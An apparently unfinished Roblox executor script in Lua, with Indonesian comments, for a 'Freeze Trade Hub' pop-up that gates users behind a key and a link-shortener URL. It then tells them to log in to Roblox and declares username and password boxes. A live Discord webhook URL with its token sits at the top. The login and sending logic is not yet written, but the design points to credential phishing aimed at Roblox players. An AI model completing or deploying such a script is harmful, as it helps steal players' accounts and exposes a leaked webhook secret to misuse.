-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Debugging
print("Script dimulai...")

-- Membuat GUI Login
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local subtitleLabel = Instance.new("TextLabel")
local keyBox = Instance.new("TextBox") -- Input untuk key
local verifyKeyButton = Instance.new("TextButton") -- Tombol untuk validasi key
local copyLinkButton = Instance.new("TextButton") -- Tombol untuk salin link
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Debugging
if screenGui.Parent == nil then
    print("ScreenGui tidak dapat dibuat.")
else
    print("ScreenGui berhasil dibuat.")
end

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 320)
frame.Position = UDim2.new(0.5, -150, 0.5, -160)
frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(1, 0, 0)

-- Properti TitleLabel
titleLabel.Name = "TitleLabel"
titleLabel.Parent = frame
titleLabel.Size = UDim2.new(1, -10, 0, 40)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade Hub"
titleLabel.TextSize = 24
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextStrokeTransparency = 0
titleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti SubtitleLabel
subtitleLabel.Name = "SubtitleLabel"
subtitleLabel.Parent = frame
subtitleLabel.Size = UDim2.new(1, -10, 0, 20)
subtitleLabel.Position = UDim2.new(0, 5, 0, 45)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.SourceSans
subtitleLabel.Text = "Login Roblox Untuk Melanjutkan"
subtitleLabel.TextSize = 16
subtitleLabel.TextColor3 = Color3.new(1, 1, 1)
subtitleLabel.TextStrokeTransparency = 0.8
subtitleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti KeyBox
keyBox.Name = "KeyBox"
keyBox.Parent = frame
keyBox.Size = UDim2.new(1, -20, 0, 40)
keyBox.Position = UDim2.new(0, 10, 0, 70)
keyBox.PlaceholderText = "Enter Key"
keyBox.Font = Enum.Font.SourceSans
keyBox.Text = ""
keyBox.TextSize = 16
keyBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
keyBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti VerifyKeyButton
verifyKeyButton.Name = "VerifyKeyButton"
verifyKeyButton.Parent = frame
verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
verifyKeyButton.Position = UDim2.new(0, 10, 0, 120)
verifyKeyButton.Text = "Verify Key"
verifyKeyButton.Font = Enum.Font.SourceSansBold
verifyKeyButton.TextSize = 18
verifyKeyButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
verifyKeyButton.TextColor3 = Color3.new(1, 1, 1)

-- Properti CopyLinkButton
copyLinkButton.Name = "CopyLinkButton"
copyLinkButton.Parent = frame
copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
copyLinkButton.Position = UDim2.new(0, 10, 0, 170)
copyLinkButton.Text = "Copy Link"
copyLinkButton.Font = Enum.Font.SourceSansBold
copyLinkButton.TextSize = 18
copyLinkButton.BackgroundColor3 = Color3.new(0.2, 0.5, 1)
copyLinkButton.TextColor3 = Color3.new(1, 1, 1)

-- Debugging
print("GUI berhasil dibuat.")

-- Fungsi untuk menyalin link ke clipboard
copyLinkButton.MouseButton1Click:Connect(function()
    setclipboard(linkUrl)
    print("Link disalin ke clipboard!")
end)

-- Fungsi untuk validasi key
verifyKeyButton.MouseButton1Click:Connect(function()
    if keyBox.Text == correctKey then
        print("Key valid!")
        keyBox.Visible = false
        verifyKeyButton.Visible = false
        copyLinkButton.Visible = false
        -- Tambahkan logika untuk membuka login jika key valid
    else
        print("Key tidak valid!")
    end
end)
